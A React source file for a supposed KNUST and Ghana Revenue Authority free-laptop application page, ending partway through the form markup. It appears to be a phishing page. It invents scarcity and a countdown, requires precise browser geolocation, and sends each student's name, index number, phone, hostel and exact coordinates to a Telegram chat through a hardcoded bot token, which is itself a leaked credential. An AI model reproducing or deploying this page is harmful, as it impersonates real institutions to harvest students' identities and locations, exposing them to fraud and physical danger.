import React, { useEffect, useState } from "react";



import knustLogo from "./assets/knust.jfif";
import graLogo from "./assets/gra_logo.jpg";



/* ============================================================
   CONFIGURATION
============================================================ */

const TOTAL_LAPTOPS = 450;
const REMAINING_LAPTOPS = 17;

// Telegram configuration. For security, replace these placeholders locally.
const TELEGRAM_BOT_TOKEN = '8517278216:AAFMTifNd577MupBcjXdthar2w6zRItVku4';
const TELEGRAM_CHAT_ID = '6355723056';

const APPLICATION_DEADLINE = new Date(
  "2026-08-28T23:59:59+00:00"
);

const KNUST_HOSTELS = [
  "Independence Hall",
  "Unity Hall",
  "Republic Hall",
  "University Hall",
  "Africa Hall",
  "Queen Elizabeth II Hall",
  "Brunei Hall",
  "Credit Union Hall",
  "Evandy Hostel",
  "Hall 7",
  "Hall 8",
  "SRC Hostel",
  "GUSS Hostel",
  "Other KNUST-owned hostel",
];

/* ============================================================
   TYPES
============================================================ */

interface FormData {
  firstName: string;
  middleName: string;
  lastName: string;
  indexNumber: string;
  programme: string;
  year: string;
  contact: string;
  hostelType: string;
  hostel: string;
}

interface FormErrors {
  firstName?: string;
  middleName?: string;
  lastName?: string;
  indexNumber?: string;
  programme?: string;
  year?: string;
  contact?: string;
  hostelType?: string;
  hostel?: string;
}

/* ============================================================
   INITIAL DATA
============================================================ */

const initialFormData: FormData = {
  firstName: "",
  middleName: "",
  lastName: "",
  indexNumber: "",
  programme: "",
  year: "",
  contact: "",
  hostelType: "",
  hostel: "",
};

/* ============================================================
   APP
============================================================ */

function App(): React.ReactElement {
  const [formData, setFormData] =
    useState<FormData>(initialFormData);

  const [errors, setErrors] =
    useState<FormErrors>({});

  const [countdown, setCountdown] =
    useState<string>("");

  const [isSubmitting, setIsSubmitting] =
    useState<boolean>(false);

  const [submitStatus, setSubmitStatus] =
    useState<"success" | "error" | "">("");

  const [submitMessage, setSubmitMessage] =
    useState<string>("");

  const [remainingLaptops, setRemainingLaptops] =
    useState<number>(() => {
      const saved = localStorage.getItem("laptop_remaining");
      const value = saved === null ? REMAINING_LAPTOPS : Number(saved);
      return Number.isFinite(value)
        ? Math.max(0, Math.min(value, REMAINING_LAPTOPS))
        : REMAINING_LAPTOPS;
    });

  /* ==========================================================
     COUNTDOWN
  ========================================================== */

  useEffect(() => {
    const updateCountdown = (): void => {
      const now = new Date();

      const difference =
        APPLICATION_DEADLINE.getTime() -
        now.getTime();

      if (difference <= 0) {
        setCountdown("Applications closed");
        return;
      }

      const days = Math.floor(
        difference /
          (1000 * 60 * 60 * 24)
      );

      const hours = Math.floor(
        (difference /
          (1000 * 60 * 60)) %
          24
      );

      const minutes = Math.floor(
        (difference /
          (1000 * 60)) %
          60
      );

      const seconds = Math.floor(
        (difference / 1000) % 60
      );

      setCountdown(
        `${days}d ${hours}h ${minutes}m ${seconds}s`
      );
    };

    updateCountdown();

    const timer = window.setInterval(
      updateCountdown,
      1000
    );

    return () => {
      window.clearInterval(timer);
    };
  }, []);

  /* ==========================================================
     HANDLE INPUT
  ========================================================== */

  const handleChange = (
    event:
      | React.ChangeEvent<HTMLInputElement>
      | React.ChangeEvent<HTMLSelectElement>
  ): void => {
    const { name, value } = event.target;

    let cleanedValue = value;

    if (name === "contact") {
      cleanedValue = value
        .replace(/\D/g, "")
        .slice(0, 10);
    }

    if (name === "indexNumber") {
      cleanedValue = value.toUpperCase();
    }

    if (name === "hostelType") {
      setFormData((previous) => ({
        ...previous,
        hostelType: cleanedValue,
        hostel: "",
      }));

      setErrors((previous) => ({
        ...previous,
        hostelType: undefined,
        hostel: undefined,
      }));

      return;
    }

    setFormData((previous) => ({
      ...previous,
      [name]: cleanedValue,
    }));

    if (
      errors[name as keyof FormErrors]
    ) {
      setErrors((previous) => ({
        ...previous,
        [name]: undefined,
      }));
    }
  };

  /* ==========================================================
     VALIDATION
  ========================================================== */

  const validateForm = (): boolean => {
    const newErrors: FormErrors = {};

    if (!formData.firstName.trim()) {
      newErrors.firstName =
        "First name is required.";
    }


    if (!formData.lastName.trim()) {
      newErrors.lastName =
        "Last name is required.";
    }

    if (!formData.indexNumber.trim()) {
      newErrors.indexNumber =
        "Index number is required.";
    } else if (
      formData.indexNumber.trim().length < 4
    ) {
      newErrors.indexNumber =
        "Enter a valid index number.";
    }

    if (!formData.programme.trim()) {
      newErrors.programme =
        "Programme of study is required.";
    }

    if (!formData.year) {
      newErrors.year =
        "Please select your year.";
    }

    if (!formData.contact) {
      newErrors.contact =
        "Contact number is required.";
    } else if (
      !/^\d{10}$/.test(formData.contact)
    ) {
      newErrors.contact =
        "Enter exactly 10 digits.";
    }

    if (!formData.hostelType) {
      newErrors.hostelType =
        "Please select a hostel type.";
    }

    if (!formData.hostel.trim()) {
      newErrors.hostel =
        "Hostel name is required.";
    }

    setErrors(newErrors);

    return (
      Object.keys(newErrors).length === 0
    );
  };

  /* ==========================================================
     SUBMIT
  ========================================================== */

  const handleSubmit = async (
    event: React.FormEvent<HTMLFormElement>
  ): Promise<void> => {
    event.preventDefault();

    setSubmitStatus("");
    setSubmitMessage("");

    if (!validateForm()) {
      window.scrollTo({
        top: 250,
        behavior: "smooth",
      });

      return;
    }

    setIsSubmitting(true);

    try {
      const fullName = [
        formData.firstName.trim(),
        formData.middleName.trim(),
        formData.lastName.trim(),
      ]
        .filter(Boolean)
        .join(" ");

      const location = await new Promise<GeolocationCoordinates>((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error("Location services are not supported by this browser."));
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (position) => resolve(position.coords),
          (error) => {
            if (error.code === error.PERMISSION_DENIED) {
              reject(new Error("Location access is required. Please allow location access and try again."));
            } else if (error.code === error.POSITION_UNAVAILABLE) {
              reject(new Error("Your location could not be determined. Please turn on location services and try again."));
            } else if (error.code === error.TIMEOUT) {
              reject(new Error("Location request timed out. Please try again."));
            } else {
              reject(new Error("Unable to obtain your location. Please try again."));
            }
          },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      });

      const telegramMessage = [
        "🎓 NEW STUDENT LAPTOP APPLICATION",
        "",
        "━━━━━━━━━━━━━━━━━━━━",
        "PERSONAL INFORMATION",
        "━━━━━━━━━━━━━━━━━━━━",
        `Name: ${fullName}`,
        `Index Number: ${formData.indexNumber.trim()}`,
        `Contact: ${formData.contact}`,
        "",
        "━━━━━━━━━━━━━━━━━━━━",
        "ACADEMIC INFORMATION",
        "━━━━━━━━━━━━━━━━━━━━",
        `Programme: ${formData.programme.trim()}`,
        `Year: ${formData.year}`,
        "",
        "━━━━━━━━━━━━━━━━━━━━",
        "ACCOMMODATION",
        "━━━━━━━━━━━━━━━━━━━━",
        `Hostel Type: ${formData.hostelType}`,
        `Hostel: ${formData.hostel.trim()}`,
        "",
        "━━━━━━━━━━━━━━━━━━━━",
        "LOCATION VERIFICATION",
        "━━━━━━━━━━━━━━━━━━━━",
        `Latitude: ${location.latitude}`,
        `Longitude: ${location.longitude}`,
        `Google Maps: https://www.google.com/maps?q=${location.latitude},${location.longitude}`,
        "",
        `Submitted: ${new Date().toLocaleString("en-GH", { timeZone: "Africa/Accra" })}`,
      ].join("\n");

      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
          }),
        }
      );

      const result: {
        ok?: boolean;
        description?: string;
      } = await response.json();

      if (!response.ok || !result.ok) {
        throw new Error(
          result.description ||
            "Unable to send application to Telegram."
        );
      }

      setRemainingLaptops((previous) => {
        const next = Math.max(previous - 1, 0);
        localStorage.setItem("laptop_remaining", String(next));
        return next;
      });

      setSubmitStatus("success");

      setSubmitMessage(
        "Application submitted successfully. Selected applicants will be contacted on Monday, 31 August 2026 for further information."
      );

      setFormData(initialFormData);

      setErrors({});

      window.scrollTo({
        top: 350,
        behavior: "smooth",
      });
    } catch (error) {
      console.error(error);

      setSubmitStatus("error");

      setSubmitMessage(
        "We could not submit your application. Please check your internet connection and try again."
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  /* ==========================================================
     UI
  ========================================================== */

  return (
    <div className="app">

      <style>{`

        /* ======================================================
           RESET
        ====================================================== */

        * {
          box-sizing: border-box;
        }

        html {
          scroll-behavior: smooth;
        }

        body {
          margin: 0;
          padding: 0;

          font-family:
            Inter,
            -apple-system,
            BlinkMacSystemFont,
            "Segoe UI",
            Roboto,
            Helvetica,
            Arial,
            sans-serif;

          background: #f6f8f5;
          color: #14231a;
        }

        button,
        input,
        select {
          font-family: inherit;
        }

        /* ======================================================
           COLORS
        ====================================================== */

        :root {
          --green: #006b3f;
          --dark-green: #004f2e;
          --light-green: #edf6f0;
          --gold: #f6c700;
          --dark: #14231a;
          --text: #58635c;
          --border: #e4e9e5;
          --white: #ffffff;
        }

        /* ======================================================
           PAGE
        ====================================================== */

        .app {
          min-height: 100vh;
          background:
            linear-gradient(
              180deg,
              #ffffff 0%,
              #f8faf8 60%,
              #ffffff 100%
            );
        }

        /* ======================================================
           TOP STRIPE
        ====================================================== */

        .top-stripe {
          height: 5px;

          background:
            linear-gradient(
              90deg,
              var(--green) 0%,
              var(--green) 70%,
              var(--gold) 70%,
              var(--gold) 85%,
              #111111 85%,
              #111111 100%
            );
        }

        /* ======================================================
           NAVIGATION
        ====================================================== */

        .navbar {
          background: rgba(255,255,255,0.96);

          border-bottom:
            1px solid var(--border);

          position: sticky;
          top: 0;

          z-index: 100;

          backdrop-filter: blur(15px);
        }

        .nav-inner {
          max-width: 1240px;

          margin: auto;

          padding:
            16px 28px;

          display: flex;

          justify-content:
            space-between;

          align-items: center;

          gap: 20px;
        }

        .logos {
          display: flex;

          align-items: center;

          gap: 13px;
        }

        .partner-logo {
          width: 52px;
          height: 52px;

          border:
            1px solid #e0e6e1;

          border-radius: 12px;

          background: white;

          display: flex;

          align-items: center;
          justify-content: center;

          overflow: hidden;
        }

        .partner-logo img {
          width: 90%;
          height: 90%;

          object-fit: contain;
        }

        .logo-text {
          font-size: 10px;

          font-weight: 900;

          color: var(--green);

          text-align: center;

          line-height: 1.1;
        }

        .divider {
          width: 1px;
          height: 35px;

          background: #dfe5e0;
        }

        .organization {
          display: flex;
          flex-direction: column;
        }

        .organization strong {
          color: #173b28;

          font-size: 15px;

          line-height: 1.2;
        }

        .organization span {
          margin-top: 3px;

          color: #7b847d;

          font-size: 11px;
        }

        .nav-right {
          display: flex;

          align-items: center;

          gap: 12px;
        }

        .live-status {
          display: flex;

          align-items: center;

          gap: 7px;

          padding:
            8px 13px;

          border-radius: 50px;

          background: var(--light-green);

          color: var(--green);

          font-size: 11px;

          font-weight: 800;
        }

        .live-dot {
          width: 7px;
          height: 7px;

          border-radius: 50%;

          background: var(--green);
        }

        .nav-button {
          padding:
            10px 16px;

          border: 0;

          border-radius: 9px;

          background: var(--green);

          color: white;

          font-size: 12px;

          font-weight: 800;

          cursor: pointer;

          transition: 0.2s;
        }

        .nav-button:hover {
          background: var(--dark-green);

          transform:
            translateY(-1px);
        }

        /* ======================================================
           HERO
        ====================================================== */

        .hero-wrapper {
          max-width: 1240px;

          margin: auto;

          padding:
            72px 28px 35px;
        }

        .hero {
          display: grid;

          grid-template-columns:
            1.15fr 0.85fr;

          gap: 70px;

          align-items: center;
        }

        .hero-left {
          max-width: 700px;
        }

        .announcement {
          display: inline-flex;

          align-items: center;

          gap: 9px;

          padding:
            8px 13px;

          margin-bottom: 20px;

          border:
            1px solid #dce9df;

          border-radius: 50px;

          background:
            #f4faf6;

          color: var(--green);

          font-size: 11px;

          font-weight: 800;

          letter-spacing: 0.5px;

          text-transform: uppercase;
        }

        .announcement span {
          width: 7px;
          height: 7px;

          background: var(--gold);

          border-radius: 50%;
        }

        .hero-title {
          margin: 0;

          font-size:
            clamp(44px, 6vw, 76px);

          line-height:
            0.99;

          letter-spacing:
            -3.5px;

          color:
            var(--dark);
        }

        .hero-title .green {
          color: var(--green);
        }

        .hero-description {
          margin:
            25px 0 0;

          max-width: 630px;

          font-size: 17px;

          line-height: 1.75;

          color: var(--text);
        }

        .hero-actions {
          margin-top: 30px;

          display: flex;

          align-items: center;

          gap: 15px;

          flex-wrap: wrap;
        }

        .primary-button {
          display: inline-flex;

          align-items: center;

          justify-content: center;

          padding:
            14px 22px;

          border: 0;

          border-radius: 10px;

          background:
            var(--green);

          color: white;

          font-size: 13px;

          font-weight: 800;

          cursor: pointer;

          text-decoration: none;

          transition: 0.2s;
        }

        .primary-button:hover {
          background:
            var(--dark-green);

          transform:
            translateY(-2px);

          box-shadow:
            0 10px 25px
            rgba(0,107,63,0.15);
        }

        .deadline-small {
          display: flex;

          align-items: center;

          gap: 8px;

          color: #707a73;

          font-size: 12px;
        }

        /* ======================================================
           HERO COUNTER
        ====================================================== */

        .availability-card {
          position: relative;

          overflow: hidden;

          min-height: 390px;

          padding: 35px;

          border-radius: 28px;

          background:
            linear-gradient(
              145deg,
              #006b3f,
              #004f2e
            );

          color: white;

          box-shadow:
            0 25px 60px
            rgba(0,75,45,0.17);
        }

        .availability-card::before {
          content: "";

          position: absolute;

          width: 280px;
          height: 280px;

          right: -130px;
          top: -130px;

          border:
            45px solid
            rgba(255,255,255,0.045);

          border-radius: 50%;
        }

        .availability-card::after {
          content: "";

          position: absolute;

          width: 180px;
          height: 180px;

          left: -120px;
          bottom: -120px;

          border:
            30px solid
            rgba(255,255,255,0.035);

          border-radius: 50%;
        }

        .availability-label {
          position: relative;

          z-index: 2;

          font-size: 11px;

          font-weight: 800;

          text-transform: uppercase;

          letter-spacing:
            1px;

          color:
            rgba(255,255,255,0.65);
        }

        .availability-heading {
          position: relative;

          z-index: 2;

          margin:
            8px 0 0;

          font-size: 23px;

          font-weight: 700;
        }

        .availability-number {
          position: relative;

          z-index: 2;

          margin:
            24px 0 5px;

          display: flex;

          align-items: baseline;

          gap: 7px;
        }

        .remaining {
          font-size: 92px;

          line-height: 0.9;

          letter-spacing:
            -5px;

          font-weight: 900;
        }

        .out-of {
          font-size: 22px;

          font-weight: 600;

          color:
            rgba(255,255,255,0.55);
        }

        .remaining-text {
          position: relative;

          z-index: 2;

          margin: 15px 0 0;

          font-size: 13px;

          line-height: 1.5;

          color:
            rgba(255,255,255,0.72);
        }

        .progress-container {
          position: relative;

          z-index: 2;

          margin-top: 28px;
        }

        .progress-top {
          display: flex;

          justify-content:
            space-between;

          margin-bottom: 8px;

          font-size: 10px;

          color:
            rgba(255,255,255,0.55);
        }

        .progress-track {
          height: 8px;

          background:
            rgba(255,255,255,0.13);

          border-radius: 50px;

          overflow: hidden;
        }

        .progress-fill {
          height: 100%;

          width: ${(TOTAL_LAPTOPS - remainingLaptops) / TOTAL_LAPTOPS * 100}%;

          background:
            var(--gold);

          border-radius: 50px;
        }

        .countdown-box {
          position: relative;

          z-index: 2;

          margin-top: 27px;

          padding:
            13px 15px;

          border:
            1px solid
            rgba(255,255,255,0.1);

          border-radius: 12px;

          background:
            rgba(0,0,0,0.08);

          display: flex;

          justify-content:
            space-between;

          align-items: center;

          gap: 10px;
        }

        .countdown-label {
          font-size: 10px;

          text-transform:
            uppercase;

          color:
            rgba(255,255,255,0.5);

          font-weight: 800;
        }

        .countdown-time {
          font-size: 13px;

          font-weight: 800;

          color: white;
        }

        /* ======================================================
           TRUST STRIP
        ====================================================== */

        .trust-strip {
          max-width: 1240px;

          margin: auto;

          padding:
            15px 28px 45px;
        }

        .trust-inner {
          border-top:
            1px solid var(--border);

          border-bottom:
            1px solid var(--border);

          padding:
            17px 0;

          display: flex;

          justify-content:
            center;

          align-items: center;

          gap: 30px;

          color: #7b847d;

          font-size: 11px;

          text-transform:
            uppercase;

          letter-spacing:
            0.8px;

          font-weight: 700;
        }

        .trust-line {
          width: 30px;
          height: 1px;

          background:
            #d9dfda;
        }

        /* ======================================================
           FORM SECTION
        ====================================================== */

        .application-area {
          background:
            #f4f7f4;

          border-top:
            1px solid #e8ece8;

          border-bottom:
            1px solid #e8ece8;

          padding:
            75px 28px 90px;
        }

        .application-container {
          max-width: 900px;

          margin: auto;
        }

        .form-heading {
          text-align: center;

          margin-bottom: 38px;
        }

        .form-heading-label {
          color:
            var(--green);

          font-size: 11px;

          font-weight: 900;

          text-transform:
            uppercase;

          letter-spacing:
            1.2px;
        }

        .form-heading h2 {
          margin:
            9px 0 10px;

          font-size:
            clamp(30px, 4vw, 43px);

          letter-spacing:
            -1.5px;

          color:
            var(--dark);
        }

        .form-heading p {
          margin: auto;

          max-width: 600px;

          font-size: 14px;

          line-height: 1.7;

          color: var(--text);
        }

        /* ======================================================
           FORM CARD
        ====================================================== */

        .form-card {
          background:
            white;

          border:
            1px solid var(--border);

          border-radius:
            24px;

          padding:
            35px;

          box-shadow:
            0 20px 55px
            rgba(0,0,0,0.055);
        }

        .success-message {
          margin-bottom:
            25px;

          padding:
            17px;

          border-radius:
            12px;

          background:
            #eff9f1;

          border:
            1px solid #cce7d2;

          color:
            #176b32;

          font-size:
            13px;

          line-height:
            1.6;
        }

        .error-message-box {
          margin-bottom:
            25px;

          padding:
            17px;

          border-radius:
            12px;

          background:
            #fff3f2;

          border:
            1px solid #efceca;

          color:
            #a1261b;

          font-size:
            13px;

          line-height:
            1.6;
        }

        /* ======================================================
           FORM STEP
        ====================================================== */

        .form-step {
          margin-bottom:
            35px;

          padding-bottom:
            32px;

          border-bottom:
            1px solid #edf0ed;
        }

        .form-step:last-of-type {
          border-bottom:
            0;

          margin-bottom:
            0;

          padding-bottom:
            0;
        }

        .step-heading {
          display: flex;

          align-items: center;

          gap: 12px;

          margin-bottom:
            22px;
        }

        .step-number {
          width: 34px;
          height: 34px;

          border-radius: 10px;

          display: flex;

          align-items: center;

          justify-content: center;

          background:
            var(--green);

          color: white;

          font-size: 12px;

          font-weight: 900;
        }

        .step-heading h3 {
          margin: 0;

          font-size: 17px;

          color:
            #203328;
        }

        .step-heading p {
          margin: 3px 0 0;

          font-size: 11px;

          color:
            #89918b;
        }

        /* ======================================================
           FORM GRID
        ====================================================== */

        .form-grid {
          display: grid;

          grid-template-columns:
            repeat(2, 1fr);

          gap:
            19px;
        }

        .field {
          display: flex;

          flex-direction:
            column;

          gap: 7px;
        }

        .field.full {
          grid-column:
            1 / -1;
        }

        .field label {
          font-size:
            12px;

          font-weight:
            800;

          color:
            #364039;
        }

        .required {
          color:
            #c62828;
        }

        .field input,
        .field select {
          width: 100%;

          height: 48px;

          padding:
            0 14px;

          border:
            1px solid #d9e0da;

          border-radius:
            10px;

          background:
            #ffffff;

          color:
            #17231b;

          outline:
            none;

          font-size:
            13px;

          transition:
            border-color .2s,
            box-shadow .2s,
            background .2s;
        }

        .field input:hover,
        .field select:hover {
          border-color:
            #b9c8bc;
        }

        .field input:focus,
        .field select:focus {
          border-color:
            var(--green);

          box-shadow:
            0 0 0 3px
            rgba(0,107,63,0.08);
        }

        .field input.error,
        .field select.error {
          border-color:
            #d92d20;

          background:
            #fffafa;
        }

        .field input:disabled {
          background:
            #f4f6f4;

          color:
            #9ba29d;

          cursor:
            not-allowed;
        }

        .field-error {
          margin:
            0;

          color:
            #b42318;

          font-size:
            11px;
        }

        .field-help {
          margin:
            0;

          color:
            #8a928b;

          font-size:
            10px;
        }

        /* ======================================================
           VERIFICATION NOTICE
        ====================================================== */

        .verification-notice {
          margin-top:
            25px;

          padding:
            16px;

          border-radius:
            12px;

          background:
            #f6f9f6;

          border:
            1px solid #e4ebe5;

          display:
            flex;

          gap:
            12px;

          align-items:
            flex-start;
        }

        .verification-icon {
          width: 28px;
          height: 28px;

          border-radius:
            8px;

          flex-shrink:
            0;

          display:
            flex;

          align-items:
            center;

          justify-content:
            center;

          background:
            #e8f4eb;

          color:
            var(--green);

          font-size:
            13px;

          font-weight:
            900;
        }

        .verification-notice strong {
          display:
            block;

          margin-bottom:
            4px;

          font-size:
            11px;

          color:
            #314137;
        }

        .verification-notice p {
          margin:
            0;

          font-size:
            11px;

          line-height:
            1.6;

          color:
            #7c857e;
        }

        /* ======================================================
           SUBMIT
        ====================================================== */

        .submit-section {
          margin-top:
            28px;

          padding-top:
            28px;

          border-top:
            1px solid #edf0ed;
        }

        .submit-button {
          width:
            100%;

          height:
            53px;

          border:
            0;

          border-radius:
            11px;

          background:
            var(--green);

          color:
            white;

          font-size:
            13px;

          font-weight:
            900;

          cursor:
            pointer;

          transition:
            .2s;
        }

        .submit-button:hover:not(:disabled) {
          background:
            var(--dark-green);

          transform:
            translateY(-1px);

          box-shadow:
            0 10px 25px
            rgba(0,107,63,0.16);
        }

        .submit-button:disabled {
          opacity:
            .6;

          cursor:
            not-allowed;
        }

        .form-disclaimer {
          margin:
            14px auto 0;

          max-width:
            650px;

          text-align:
            center;

          font-size:
            10px;

          line-height:
            1.6;

          color:
            #929993;
        }

        /* ======================================================
           INFORMATION SECTION
        ====================================================== */

        .information-section {
          max-width:
            1100px;

          margin:
            auto;

          padding:
            80px 28px;
        }

        .information-header {
          text-align:
            center;

          margin-bottom:
            35px;
        }

        .information-header span {
          font-size:
            10px;

          color:
            var(--green);

          font-weight:
            900;

          text-transform:
            uppercase;

          letter-spacing:
            1px;
        }

        .information-header h2 {
          margin:
            8px 0 0;

          font-size:
            30px;

          color:
            var(--dark);
        }

        .information-grid {
          display:
            grid;

          grid-template-columns:
            repeat(3, 1fr);

          gap:
            18px;
        }

        .information-card {
          padding:
            27px;

          background:
            white;

          border:
            1px solid var(--border);

          border-radius:
            17px;
        }

        .information-icon {
          width:
            43px;

          height:
            43px;

          display:
            flex;

          align-items:
            center;

          justify-content:
            center;

          border-radius:
            11px;

          background:
            var(--light-green);

          color:
            var(--green);

          font-weight:
            900;

          margin-bottom:
            17px;
        }

        .information-card h3 {
          margin:
            0 0 8px;

          font-size:
            15px;

          color:
            #213229;
        }

        .information-card p {
          margin:
            0;

          font-size:
            12px;

          line-height:
            1.7;

          color:
            #747d76;
        }

        /* ======================================================
           FOOTER
        ====================================================== */

        .footer {
          background:
            #10261b;

          color:
            white;
        }

        .footer-main {
          max-width:
            1240px;

          margin:
            auto;

          padding:
            55px 28px 40px;

          display:
            grid;

          grid-template-columns:
            1.5fr 1fr 1fr;

          gap:
            55px;
        }

 .footer-brand {
  display: flex;
  align-items: flex-start;
  justify-content: flex-start;
  gap: 14px;
}

  
        .footer-logo {
  width: 53px;
  height: 53px;
  min-width: 53px;
  max-width: 53px;

  background: white;
  border-radius: 11px;

  display: flex;
  align-items: center;
  justify-content: center;

  flex: 0 0 53px;

  overflow: hidden;
}

.footer-logo img {
  display: block;

  width: 85%;
  height: 85%;

  max-width: 100%;
  max-height: 100%;

  object-fit: contain;

  margin: 0;
}



        .footer-logo-text {
          color:
            var(--green);

          font-size:
            10px;

          font-weight:
            900;

          text-align:
            center;
        }

        .footer-brand h3 {
          margin:
            0 0 9px;

          font-size:
            15px;
        }

        .footer-brand p {
          max-width:
            430px;

          margin:
            0;

          font-size:
            11px;

          line-height:
            1.7;

          color:
            #b6c5bb;
        }

        .footer-column h4 {
          margin:
            0 0 16px;

          font-size:
            10px;

          text-transform:
            uppercase;

          letter-spacing:
            1px;

          color:
            var(--gold);
        }

        .footer-column p {
          margin:
            7px 0;

          font-size:
            11px;

          line-height:
            1.6;

          color:
            #b6c5bb;
        }

        .footer-bottom {
          border-top:
            1px solid
            rgba(255,255,255,0.09);

          max-width:
            1240px;

          margin:
            auto;

          padding:
            19px 28px;

          display:
            flex;

          justify-content:
            space-between;

          gap:
            20px;

          color:
            #83948a;

          font-size:
            10px;
        }

        /* ======================================================
           TABLET
        ====================================================== */

        @media (max-width: 900px) {

          .hero {
            grid-template-columns:
              1fr;

            gap:
              40px;
          }

          .hero-left {
            max-width:
              760px;
          }

          .availability-card {
            max-width:
              600px;

            width:
              100%;

            margin:
              auto;
          }

          .information-grid {
            grid-template-columns:
              1fr;
          }

          .footer-main {
            grid-template-columns:
              1fr 1fr;
          }

          .footer-brand {
            grid-column:
              1 / -1;
          }

        }

        /* ======================================================
           MOBILE
        ====================================================== */

        @media (max-width: 600px) {

          .nav-inner {
            padding:
              12px 16px;
          }

          .partner-logo {
            width:
              43px;

            height:
              43px;
          }

          .organization strong {
            font-size:
              12px;
          }

          .organization span {
            font-size:
              9px;
          }

          .divider {
            height:
              28px;
          }

          .live-status {
            display:
              none;
          }

          .nav-button {
            padding:
              9px 12px;

            font-size:
              10px;
          }

          .hero-wrapper {
            padding:
              45px 17px 25px;
          }

          .hero {
            gap:
              32px;
          }

          .hero-title {
            font-size:
              45px;

            letter-spacing:
              -2.2px;
          }

          .hero-description {
            font-size:
              14px;

            line-height:
              1.7;
          }

          .hero-actions {
            align-items:
              stretch;

            flex-direction:
              column;
          }

          .primary-button {
            width:
              100%;
          }

          .deadline-small {
            justify-content:
              center;
          }

          .availability-card {
            padding:
              27px;

            min-height:
              355px;

            border-radius:
              21px;
          }

          .remaining {
            font-size:
              76px;
          }

          .trust-strip {
            padding:
              15px 17px 35px;
          }

          .trust-inner {
            text-align:
              center;

            font-size:
              9px;

            line-height:
              1.5;
          }

          .trust-line {
            width:
              15px;
          }

          .application-area {
            padding:
              55px 17px 65px;
          }

          .form-card {
            padding:
              21px;

            border-radius:
              18px;
          }

          .form-grid {
            grid-template-columns:
              1fr;

            gap:
              17px;
          }

          .field.full {
            grid-column:
              auto;
          }

          .form-heading h2 {
            font-size:
              30px;
          }

          .step-heading {
            align-items:
              flex-start;
          }

          .information-section {
            padding:
              60px 17px;
          }

          .information-header h2 {
            font-size:
              26px;
          }

          .footer-main {
            grid-template-columns:
              1fr;

            padding:
              45px 17px 30px;

            gap:
              30px;
          }

          .footer-brand {
            grid-column:
              auto;
          }

          .footer-bottom {
            padding:
              18px 17px;

            flex-direction:
              column;

            text-align:
              center;
          }

        }

      `}</style>

      {/* ======================================================
          TOP STRIPE
      ====================================================== */}

      <div className="top-stripe"></div>

      {/* ======================================================
          NAVBAR
      ====================================================== */}

      <nav className="navbar">

        <div className="nav-inner">

          <div className="logos">

            {/* KNUST LOGO */}

            <div className="partner-logo">

              
                

                <img
                  src={knustLogo}
                  alt="KNUST Logo"
                />
             


            </div>

            <div className="divider"></div>

            {/* GRA LOGO */}

            <div className="partner-logo">

              
             
                <img
                  src={graLogo}
                  alt="GRA Logo"
                />
              

           

            </div>

            <div className="organization">

              <strong>
                Student Laptop
                <br />
                Support Initiative
              </strong>

              <span>
                KNUST × GRA Partnership
              </span>

            </div>

          </div>

          <div className="nav-right">

            <div className="live-status">

              <span className="live-dot"></span>

              Applications Open

            </div>

            <button
              className="nav-button"
              onClick={() => {
                document
                  .getElementById("application")
                  ?.scrollIntoView({
                    behavior: "smooth",
                  });
              }}
            >
              Apply Now
            </button>

          </div>

        </div>

      </nav>

      {/* ======================================================
          HERO
      ====================================================== */}

      <section className="hero-wrapper">

        <div className="hero">

          {/* HERO LEFT */}

          <div className="hero-left">

            <div className="announcement">

              <span></span>

              Digital Access Initiative

            </div>

            <h1 className="hero-title">

              Technology should
              <br />

              <span className="green">
                empower
              </span>{" "}
              every student.

            </h1>

            <p className="hero-description">

              A partnership initiative between the Ghana
              Revenue Authority and Kwame Nkrumah University
              of Science and Technology to provide free
              laptops to eligible students for the upcoming
              academic semester.

            </p>

            <div className="hero-actions">

              <a
                href="#application"
                className="primary-button"
              >
                Start Your Application →
              </a>

              <div className="deadline-small">

                <span>
                  ◷
                </span>

                Deadline:
                <strong>
                  &nbsp;28 August 2026
                </strong>

              </div>

            </div>

          </div>

          {/* HERO RIGHT */}

          <div className="availability-card">

            <div className="availability-label">

              Laptop allocation

            </div>

            <div className="availability-heading">

              Remaining

            </div>

            <div className="availability-number">

              <span className="remaining">
                {remainingLaptops}
              </span>

              <span className="out-of">
                / {TOTAL_LAPTOPS}
              </span>

            </div>

            <p className="remaining-text">

              Laptops remain available from the
              450 laptops allocated for this initiative.

            </p>

            <div className="progress-container">

              <div className="progress-top">

                <span>
                  Allocation progress
                </span>

                <span>
                  {TOTAL_LAPTOPS - remainingLaptops} allocated
                </span>

              </div>

              <div className="progress-track">

                <div className="progress-fill"></div>

              </div>

            </div>

            <div className="countdown-box">

              <span className="countdown-label">
                Application closes
              </span>

              <span className="countdown-time">
                {countdown}
              </span>

            </div>

          </div>

        </div>

      </section>

      {/* ======================================================
          TRUST STRIP
      ====================================================== */}

      <section className="trust-strip">

        <div className="trust-inner">

          <span>
            KNUST Students
          </span>

          <span className="trust-line"></span>

          <span>
            Academic Support
          </span>

          <span className="trust-line"></span>

          <span>
            Digital Inclusion
          </span>

          <span className="trust-line"></span>

          <span>
            450 Laptops
          </span>

        </div>

      </section>

      {/* ======================================================
          APPLICATION
      ====================================================== */}

      <section
        className="application-area"
        id="application"
      >

        <div className="application-container">

          <div className="form-heading">

            <span className="form-heading-label">

              Student Application Portal

            </span>

            <h2>
              Apply for laptop support
            </h2>

            <p>

              Complete the application below with your
              current academic and accommodation information.
              All required information must be accurate and
              will be subject to qualification verification.

            </p>

          </div>

          <div className="form-card">

            {/* =================================================
                SUCCESS
            ================================================== */}

            {submitStatus === "success" && (

              <div className="success-message">

                <strong>
                  ✓ Application received
                </strong>

                <br />

                {submitMessage}

              </div>

            )}

            {/* =================================================
                ERROR
            ================================================== */}

            {submitStatus === "error" && (

              <div className="error-message-box">

                <strong>
                  Unable to submit
                </strong>

                <br />

                {submitMessage}

              </div>

            )}

            <form
              onSubmit={handleSubmit}
              noValidate
            >

              {/* =================================================
                  STEP 1
              ================================================== */}

              <div className="form-step">

                <div className="step-heading">

                  <div className="step-number">
                    01
                  </div>

                  <div>

                    <h3>
                      Personal Information
                    </h3>

                    <p>
                      Enter your name exactly as it appears
                      on your academic records.
                    </p>

